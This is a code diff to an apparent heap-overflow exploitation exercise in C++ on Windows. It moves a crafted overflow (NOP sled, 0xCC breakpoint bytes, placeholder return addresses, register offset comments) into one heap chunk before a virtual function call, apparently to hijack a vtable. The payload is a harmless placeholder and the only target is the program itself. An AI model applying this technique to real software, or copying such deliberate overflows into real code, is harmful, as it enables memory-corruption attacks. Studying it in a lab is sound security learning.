@@ -31,16 +31,7 @@ int main(int args, char ** argv){
 	for(i = 0; i < ALLOC_COUNT; i++){
 	hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
 	memset(hChunk, 'A', 0x190);
-	char return_address_1[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
-	char return_address_2[] = "\xCC\xCC\xCC\xCC";
-	char return_address_3[] = "\xDD\xDD\xDD\xDD";
-	char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC";
-	// EAX OFFSET = 24
-	// EDX offset = 28
-	memmove((char *) hChunk + 400, return_address_1, 0x18);
-	memmove((char *) hChunk + 424, return_address_2, 0x4);
-	memmove((char *) hChunk + 428, return_address_3, 0x4);
-	memmove((char *) hChunk + 432, payload, 0x1C);
+
 	allocations[i] = hChunk;
 
 	printf("[%d] Heap chunk in backend : 0x%08x\n", i, hChunk);
@@ -69,8 +60,19 @@ int main(int args, char ** argv){
 	printf("vector : 0x%08p\n", (void*) &v8);
 	printf("vector : 0x%08p\n", (void*) &v9);
 	printf("vector : 0x%08p\n", (void*) &v10);
-
-	memset(allocations[2], 'B', CHUNK_SIZE + 8 + 32);
+	memset(allocations[2], 'A', 0x190);
+	char return_address_1[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+	char return_address_2[] = "\xCC\xCC\xCC\xCC";
+	char return_address_3[] = "\xDD\xDD\xDD\xDD";
+	char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC";
+	// EAX OFFSET = 24
+	// EDX offset = 28
+	memmove((char *) allocations[2] + 400, return_address_1, 0x18);
+	memmove((char *) allocations[2] + 424, return_address_2, 0x4);
+	memmove((char *) allocations[2] + 428, return_address_3, 0x4);
+	memmove((char *) allocations[2] + 432, payload, 0x1C);
+	memset((char *) allocations[2] + 464, 'A', 0x1000);
+	 //memset(allocations[2], 'B', CHUNK_SIZE + 8 + 32);
 	v1.at(0)->virtualFunction();
 	system("PAUSE");
 
